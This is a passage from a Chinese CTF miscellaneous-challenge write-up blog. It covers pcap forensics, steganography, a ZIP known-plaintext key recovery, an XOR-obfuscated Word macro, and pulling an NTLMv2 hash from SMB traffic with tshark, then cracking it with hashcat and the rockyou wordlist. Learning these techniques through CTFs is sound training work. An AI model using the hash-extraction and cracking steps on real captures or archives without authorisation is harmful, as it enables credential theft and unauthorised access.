src="屏幕截图 2025-03-03 114643.png" alt="屏幕截图 2025-03-03 114643" style="zoom:80%;"><p>追踪tcp流之后发现</p><p>![屏幕截图 2025-03-03 115626](.&#x2F;Misc-Record&#x2F;屏幕截图 2025-03-03 115626.png)</p><p>这个就是发送者的邮箱了<code>xsser@live.cn</code></p><p>flag{<a href="mailto:&#x78;&#115;&#115;&#101;&#114;&#x40;&#x6c;&#105;&#118;&#x65;&#46;&#x63;&#110;">&#x78;&#115;&#115;&#101;&#114;&#x40;&#x6c;&#105;&#118;&#x65;&#46;&#x63;&#110;</a>}</p><h3 id="131-蜘蛛侠呀"><a href="#131-蜘蛛侠呀" class="headerlink" title="131.蜘蛛侠呀"></a>131.蜘蛛侠呀</h3><p>一段流量。</p><p>发现icmp后面每段都带有一段的data数据，猜测是将一个文件分散在了这里。</p><p>可以使用tshark导出这些数据，然后去重，再用脚本</p><p>提取：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r out.pcap -T fields -e data &gt; data.txt</span><br></pre></td></tr></table></figure><p>去重脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    res_list = []</span><br><span class="line">    lines = file.readlines()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+]去重之前一共&#123;0&#125;行&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(lines)))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+]开始去重，请稍等.....&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> lines:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> res_list:</span><br><span class="line">            res_list.append(i)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+]去重后一共&#123;0&#125;行&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(res_list)))</span><br><span class="line">    <span class="built_in">print</span>(res_list)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data1.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> new_file:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> res_list:</span><br><span class="line">        new_file.write(j)</span><br></pre></td></tr></table></figure><p>十六进制转字符：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"> </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data1.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data2.txt&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> data:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> file.readlines():</span><br><span class="line">            data.write(binascii.unhexlify(i[:-<span class="number">1</span>]))</span><br></pre></td></tr></table></figure><p>删除重复字符：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">remove_specific_string</span>(<span class="params">input_file, output_file, target_string=<span class="string">&#x27;$$START$$&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        content = file.read()</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 替换文件中的特定字符串</span></span><br><span class="line">    content = content.replace(target_string, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        file.write(content)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 使用示例</span></span><br><span class="line">input_file = <span class="string">&#x27;data2.txt&#x27;</span>  <span class="comment"># 要处理的文件名</span></span><br><span class="line">output_file = <span class="string">&#x27;data3.txt&#x27;</span>  <span class="comment"># 输出的文件名</span></span><br><span class="line">remove_specific_string(input_file, output_file)</span><br></pre></td></tr></table></figure><p>删除换行符:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">remove_newlines</span>(<span class="params">input_file, output_file</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        content = file.read()</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 去除所有换行符</span></span><br><span class="line">    content = content.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        file.write(content)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 使用示例</span></span><br><span class="line">input_file = <span class="string">&#x27;data3.txt&#x27;</span>  <span class="comment"># 要处理的文件名</span></span><br><span class="line">output_file = <span class="string">&#x27;data4.txt&#x27;</span>  <span class="comment"># 输出的文件名</span></span><br><span class="line">remove_newlines(input_file, output_file)</span><br></pre></td></tr></table></figure><p>data4.txt转换成压缩包：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"> </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data4.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;res.zip&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> new_file:</span><br><span class="line">        new_file.write(base64.b64decode(file.read()))</span><br></pre></td></tr></table></figure><p>发现一张gif</p><p>使用indentify（这里identify是imagemagick的一个组件功能挺多的）输出文件格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">identify -format &quot;%T&quot; flag.gif</span><br></pre></td></tr></table></figure><p>输出</p><p><code>2050502050502050205020202050202020205050205020502050205050505050202050502020205020505050205020206666</code></p><p>20替换成0，50替换成1</p><p>得到<code>011011010100010000110101010111110011000101110100</code></p><p>二进制转换字符再md5即可</p><p>flag：flag{f0f1003afe4ae8ce4aa8e8487a8ab3b6}</p><h3 id="131-greatescape"><a href="#131-greatescape" class="headerlink" title="131.greatescape"></a>131.greatescape</h3><p>直接搜索ftp，发现scc.key，猜测是加密的私钥</p><img src="屏幕截图 2025-03-03 135010.png" alt="屏幕截图 2025-03-03 135010" style="zoom:80%;"><p>看下一个流（19），发现</p><img src="屏幕截图 2025-03-03 135126.png" alt="屏幕截图 2025-03-03 135126" style="zoom:80%;"><p>直接另存scc.key</p><p>再将私钥文件导入流量包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">编辑-&gt;首选项-&gt;Protocols-&gt;TLS-&gt;edit-&gt;+号-&gt;Key File-&gt;输入ssc.key-&gt;OK</span><br></pre></td></tr></table></figure><p>然后就多了很多http流量，直接搜索flag,或者慢慢找</p><p>最后发现flag</p><img src="屏幕截图 2025-03-03 135922.png" alt="屏幕截图 2025-03-03 135922" style="zoom:80%;"><p>flag：flag{OkThatWasWay2Easy}</p><h3 id="132-安洵杯-2019-easy-misc"><a href="#132-安洵杯-2019-easy-misc" class="headerlink" title="132.[安洵杯 2019]easy misc"></a>132.[安洵杯 2019]easy misc</h3><p>压缩包密码格式说是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG IN ((√2524921X85÷5+2)÷15-1794)+NNULLULL,</span><br></pre></td></tr></table></figure><p>因为这个(√2524921X85÷5+2)÷15-1794)&#x3D;7，所以前面有七位，掩码爆破一下</p><p>爆破出来是<code>2019456NNULLULL,</code>，解压</p><p>看到</p><img src="屏幕截图 2025-03-04 180342.png" alt="屏幕截图 2025-03-04 180342" style="zoom:80%;"><p>然后foremost分离一下那个小姐姐.png</p><p>又得到两张一模一样的图片，猜测有双图盲水印隐写，使用puzzlesolver得到</p><img src="屏幕截图 2025-03-04 181237.png" alt="屏幕截图 2025-03-04 181237" style="zoom:50%;"><p>是<code>in 11.txt</code>，我们打开这个read&#x2F;11.txt</p><p>字频统计一下（puzzlesolver），得到前16个字符是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">etaonrhisdluygwm</span><br></pre></td></tr></table></figure><p>再根据前面得到的替换表替换一下</p><p>前16个字符替换一下得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QW8obWdIWT9pMkFSQWtRQjVfXiE/WSFTajBtcw==</span><br></pre></td></tr></table></figure><p>直接basecrack一下就能得到flag</p><img src="屏幕截图 2025-03-04 181758.png" alt="屏幕截图 2025-03-04 181758" style="zoom:80%;"><p>flag：flag{have_a_good_day1}</p><h3 id="133-Business-Planning-Group"><a href="#133-Business-Planning-Group" class="headerlink" title="133.Business Planning Group"></a>133.Business Planning Group</h3><p>一张图片，尾部发现这个隐藏文件，需要我们手动提取</p><img src="屏幕截图 2025-03-04 191107.png" alt="屏幕截图 2025-03-04 191107" style="zoom:80%;"><p>手动提取一下，这个是bpg文件</p><p>一般的东西打不开，去下一个 <a href="https://github.com/asimba/pybpgviewer/releases/tag/v1.28">Release Simple BPG Image viewer · asimba&#x2F;pybpgviewer</a></p><p>看到<img src="屏幕截图 2025-03-04 191503.png" alt="屏幕截图 2025-03-04 191503" style="zoom:67%;"></p><p>得到YnNpZGVzX2RlbGhpe0JQR19pNV9iM3R0M3JfN2g0bl9KUEd9Cg&#x3D;&#x3D;</p><p>解码一下得到bsides_delhi{BPG_i5_b3tt3r_7h4n_JPG}</p><p>flag：flag{BPG_i5_b3tt3r_7h4n_JPG}</p><h3 id="134"><a href="#134" class="headerlink" title="134."></a>134.</h3><h3 id="大流量分析（三）"><a href="#大流量分析（三）" class="headerlink" title="大流量分析（三）"></a>大流量分析（三）</h3><p>这题是找后门</p><p>找后门的思路——找关键字：eval、system、phpinfo()等；</p><p>在查找phpinfo的时候发现</p><img src="屏幕截图 2025-03-03 121009.png" alt="屏幕截图 2025-03-03 121009" style="zoom:80%;"><p>找到了后门文件admin.bak.php</p><p>flag：flag{admin.bak.php}</p><h2 id="2-2024浙江省赛复现"><a href="#2-2024浙江省赛复现" class="headerlink" title="2.2024浙江省赛复现"></a>2.2024浙江省赛复现</h2><h3 id="1-real-signin"><a href="#1-real-signin" class="headerlink" title="1.real signin"></a>1.real signin</h3><p>得到一张out.png，用zsteg跑一下发现：</p><img src="2024-12-08 135507.png" alt="2024-12-08 135507" style="zoom:75%;"><p>得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dEFfc1dGq1pxMgMWnihrMx9mewNgdvIWMvctrc</span><br></pre></td></tr></table></figure><p>和</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ABCDEFGHIJKLMNabcdefghijklmnopqrstuvwxyzOPQRSTUVWXYZ0123456789+/</span><br></pre></td></tr></table></figure><p>猜测是换表的base64，解密得到flag：DASCTF{We1C0me_2_ZJCTF2024!}</p><h3 id="2-机密文档"><a href="#2-机密文档" class="headerlink" title="2.机密文档"></a>2.机密文档</h3><p>得到一个加密的压缩包，发现加密方式是store，猜测为明文攻击</p><img src="2024-12-08 140955.png" alt="2024-12-08 140955" style="zoom:80%;"><blockquote><p>[!NOTE]</p><p>将一个名为flag.txt的文件打包成ZIP压缩包后，发现文件名称会出现在压缩包文件头中，且偏移固定为30</p><p>且默认情况下，flag.zip也会作为该压缩包的名称</p><p>已知的明文片段有：</p><p>“flag.txt” 8个字节，偏移30</p><p>ZIP本身文件头：50 4B 03 04 ，4字节</p><p>满足12字节的要求</p></blockquote><p>其中 -C 后面跟的是原本的zip，-c 后面跟的是里面需要解密出来的zip，-x 后面是已知的明文，30 表示偏移量，7468655F7365637265745F796F755F6E657665725F657665725F6B6E6F775F6861686168616861是the_secret_you_never_ever_know_hahahaha的16进制转换，即用010打开后看到的。下一个 -x 0 是zip的偏移量，504B0304是zip的16进制表示。</p><p> 可以看到解压出来的keys是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b8edf1ff c1f93a7e f93d08e0</span><br></pre></td></tr></table></figure><p>得到三段密钥就可以修改压缩包密码了：</p><p>![2024-12-08 141849](.&#x2F;Misc-Record&#x2F;2024-12-08 141849.png)</p><p>修改了密码为123</p><p>解压后得到一个docm文档，猜测是跟宏有关的，wps打开发现</p><img src="2024-12-08 142113.png" alt="2024-12-08 142113" style="zoom:50%;"><p>这里可以使用wps里查看宏，也可以olevba看</p><p>wps 里查看如下：</p><img src="2024-12-08 142319.png" alt="2024-12-08 142319" style="zoom:67%;"><p>olevba 查看如下：</p><img src="2024-12-08 143620.png" alt="2024-12-08 143620" style="zoom:75%;"><p>反正最后得到如下宏代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Sub key()</span><br><span class="line">    Dim decValues As Variant</span><br><span class="line">    Dim str As String</span><br><span class="line">    Dim result As String</span><br><span class="line">    Dim i As Integer</span><br><span class="line">    Dim xorValue As Integer</span><br><span class="line">    </span><br><span class="line">    decValues = Array(26, 25, 28, 0, 16, 1, 74, 75, 45, 29, 19, 49, 61, 60, 3)</span><br><span class="line">    str = &quot;outguess&quot;</span><br><span class="line">    result = &quot;&quot;</span><br><span class="line"></span><br><span class="line">    For i = LBound(decValues) To UBound(decValues)</span><br><span class="line">        xorValue = decValues(i) Xor Asc(Mid(str, (i Mod Len(str)) + 1, 1))</span><br><span class="line">        result = result &amp; Chr(xorValue)</span><br><span class="line">    Next i</span><br><span class="line"></span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure><p>可以发现是一个异或代码，可以手搓脚本解密，也可以cyberchef</p><p>cyberchef得到如下：</p><img src="2024-12-08 144013.png" alt="2024-12-08 144013" style="zoom:75%;"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ulhged98BhgVHYp</span><br></pre></td></tr></table></figure><p>由于之前提示了是outguess加密，将docm后缀改为zip后在 word &#x2F; media 里拿到图片 image1.jpeg</p><p>由于outguess不认识jpeg，需要我们修改后缀名为jpg</p><p>![2024-12-08 144645](.&#x2F;Misc-Record&#x2F;2024-12-08 144645.png)</p><p>得到flag：DASCTF{B1g_S3CR3t_F0R_Y0u}</p><h3 id="3-EZtraffic"><a href="#3-EZtraffic" class="headerlink" title="3.EZtraffic"></a>3.EZtraffic</h3><p>拿到流量分析一下就可以在SMB里发现有传输流量包，导出一下</p><img src="2024-12-16 225216.png" alt="2024-12-16 225216" style="zoom:75%;"><p>发现有三个压缩包，但是只有其中一个是<code>final_out</code>，即最后的zip</p><p>这里最好不要用foremost和binwalk，因为你会发现导出的压缩包里面会少东西。</p><p>打开压缩包发现</p><img src="2024-12-16 225430.png" alt="2024-12-16 225430" style="zoom:75%;"><p>注释</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NTLM v2 plaintext + \d&#123;5&#125;</span><br></pre></td></tr></table></figure><p>这里后来才知道需要提取 NTLMv2 哈希值并破解，可以看lunatic师傅的博客 <a href="https://goodlunatic.github.io/posts/5422d65/#ntlm%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90">这里</a></p><p>而且这里 + \d{5} 提示后面再跟五位数字爆破。</p><p>这里可以用tshark导出（tshark是kali自带的）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -n -r eztraffic.pcapng -Y &#x27;ntlmssp.messagetype == 0x00000003&#x27; -T fields -e ntlmssp.auth.username -e ntlmssp.auth.domain -e ntlmssp.ntlmv2_response.ntproofstr -e ntlmssp.auth.sesskey -e smb2.sesid</span><br></pre></td></tr></table></figure><p>得到</p><img src="2024-12-16 230745.png" alt="2024-12-16 230745" style="zoom:75%;"><p>这里我们需要的是<code>username::domain:ServerChallenge:NTproofstring:modifiedntlmv2response</code>并且需要以这个形式保存到txt里</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rockyou #username</span><br><span class="line">MicrosoftAccount #domain</span><br><span class="line">db12ced50faf52f141636e80205e8f28 #ServerChallenge</span><br><span class="line">66aa2c3634e34e6e330949b82d4d2a64 #NTproofstring</span><br><span class="line">而modifiedntlmv2response需要我们回到流量里找一下</span><br></pre></td></tr></table></figure><p>先过滤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntlmssp</span><br></pre></td></tr></table></figure><p>可以看到很多流,其中有一个是<code>NTLMSSP_AUTH</code>的</p><p>在里面找<code>NTLMv2 Response</code>，可以看到</p><img src="2024-12-16 235130.png" alt="2024-12-16 235130" style="zoom:75%;"><p>除了<code>NTProofStr</code>以外的就是我们要找的<code>modifiedntlmv2response</code>了（注意这里复制hex值）</p><p>最后得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rockyou::MicrosoftAccount:4936df20962cae6d:db12ced50faf52f141636e80205e8f28:01010000000000003604281b951fdb017b4045aa008508eb0000000002001e00440042004500440036004200350041002d0035003100430032002d00340001001e00440042004500440036004200350041002d0035003100430032002d00340004004800640062006500640036006200350061002d0035003100630032002d0034003100650063002d0061006400380034002d0064006400320062003500370030006400350030003900360003004800640062006500640036006200350061002d0035003100630032002d0034003100650063002d0061006400380034002d00640064003200620035003700300064003500300039003600070008003604281b951fdb01060004000200000008003000300000000000000001000000002000008029a5d8256e5c2762f439df5c06f3bc411fb0faeb3a6fa52d9273c57b09f2d10a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e0031002e00380031000000000000000000</span><br></pre></td></tr></table></figure><p>将以上的内容保存到<code>hash.txt</code>中，用hashcat爆破，命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.\hashcat -m 5600 hash.txt rockyou.txt</span><br><span class="line"># 5600 表示NetNTLMv2模式</span><br><span class="line"># rockyou是github上找的字典，还挺大</span><br></pre></td></tr></table></figure><img src="2024-12-17 002646.png" alt="2024-12-17 002646" style="zoom:67%;"><p>得到密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">haticehatice</span><br></pre></td></tr></table></figure><p>接下来就是5位掩码爆破了，ARP秒出</p><img src="2024-12-17 003142.png" alt="2024-12-17 003142" style="zoom:50%;"><p>得到密码<code>haticehatice12580</code>，解压压缩包，看到有100张图片碎片，猜测是拼图</p><img src="2024-12-17 133927.png" alt="2024-12-17 133927" style="zoom:75%;"><p>猜测图片应该是有顺序的，不然也太难拼了</p><p>在stegsolve的rad0里看到</p><img src="2024-12-17 134555.png" alt="2024-12-17 134555" style="zoom:50%;"><p>QCR扫一下，看到</p><img src="2024-12-17 135101.png" alt="2024-12-17 135101" style="zoom:50%;"><p>这里需要我们按照顺序一个个的把图片更改一下</p><p>利用脚本拼接一下（脚本抄的。）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> pyzbar.pyzbar <span class="keyword">import</span> decode</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_lsb</span>(<span class="params">imgname</span>):</span><br><span class="line">    r = []</span><br><span class="line">    img = Image.<span class="built_in">open</span>(imgname)</span><br><span class="line">    width,height = img.size</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">            pixel = img.getpixel((x,y))</span><br><span class="line">            r.append(<span class="built_in">str</span>(pixel[<span class="number">0</span>] &amp; <span class="number">1</span>))</span><br><span class="line">            <span class="comment"># print(pixel)</span></span><br><span class="line">    bin_data = <span class="string">&#x27;&#x27;</span>.join(r)</span><br><span class="line">    <span class="keyword">return</span> bin_data  </span><br><span class="line">            </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bin2img</span>(<span class="params">bin_data</span>):</span><br><span class="line">    imgname = <span class="string">&quot;tmp.png&quot;</span></span><br><span class="line">    pixels = []</span><br><span class="line">    img = Image.new(<span class="string">&quot;RGB&quot;</span>,(<span class="number">50</span>,<span class="number">50</span>))</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> bin_data:</span><br><span class="line">        <span class="keyword">if</span> item ==<span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            pixels.append((<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            pixels.append((<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">    img.putdata(pixels)</span><br><span class="line">    <span class="comment"># img.show()</span></span><br><span class="line">    img = img.resize((<span class="number">500</span>,<span class="number">500</span>)) </span><br><span class="line">    <span class="comment"># 这里调整一下图片的大小，便于后面pyzbar的识别</span></span><br><span class="line">    img.save(imgname)</span><br><span class="line">    <span class="keyword">return</span> imgname</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_qrcode</span>(<span class="params">imgname</span>):</span><br><span class="line">    img = Image.<span class="built_in">open</span>(imgname)</span><br><span class="line">    decode_data = decode(img)</span><br><span class="line">    <span class="comment"># print(decode_data)</span></span><br><span class="line">    res = decode_data[<span class="number">0</span>].data.decode()</span><br><span class="line">    os.remove(imgname)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">        </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rename_img</span>():</span><br><span class="line">    filenames = os.listdir(<span class="string">&quot;./final_out&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> filenames:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            src_img = <span class="string">&quot;./final_out/&quot;</span>+filename</span><br><span class="line">            bin_data = extract_lsb(src_img)</span><br><span class="line">            imgname = bin2img(bin_data)</span><br><span class="line">            res = read_qrcode(imgname)</span><br><span class="line">            dst_img = <span class="string">f&quot;./final_out/<span class="subst">&#123;res&#125;</span>.png&quot;</span></span><br><span class="line">            os.rename(src_img,dst_img)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] <span class="subst">&#123;src_img&#125;</span> ===&gt; <span class="subst">&#123;dst_img&#125;</span> down!!!&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[-] <span class="subst">&#123;src_img&#125;</span> Error!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge_img</span>():</span><br><span class="line">    cols = <span class="number">10</span></span><br><span class="line">    rows = <span class="number">10</span></span><br><span class="line">    img_list = []</span><br><span class="line">    new_img = Image.new(<span class="string">&quot;RGB&quot;</span>,(<span class="number">500</span>,<span class="number">500</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">101</span>):</span><br><span class="line">        img = Image.<span class="built_in">open</span>(<span class="string">f&quot;./final_out/<span class="subst">&#123;i&#125;</span>.png&quot;</span>)</span><br><span class="line">        img_list.append(img)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(rows):</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(cols):</span><br><span class="line">            idx = y * cols + x</span><br><span class="line">            img = img_list[idx]</span><br><span class="line">            x_offset = x * <span class="number">50</span></span><br><span class="line">            y_offset = y * <span class="number">50</span></span><br><span class="line">            new_img.paste(img,(x_offset,y_offset))</span><br><span class="line">            </span><br><span class="line">    <span class="comment"># new_img.show()</span></span><br><span class="line">    new_img.save(<span class="string">&quot;flag.png&quot;</span>)</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># rename_img()</span></span><br><span class="line">    merge_img()</span><br></pre></td></tr></table></figure><p>最后得到</p><img src="2024-12-17 135936.png" alt="2024-12-17 135936" style="zoom:50%;"><h3 id="4-FinalSign"><a href="#4-FinalSign" class="headerlink" title="4.FinalSign"></a>4.FinalSign</h3><p>文章能看到的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 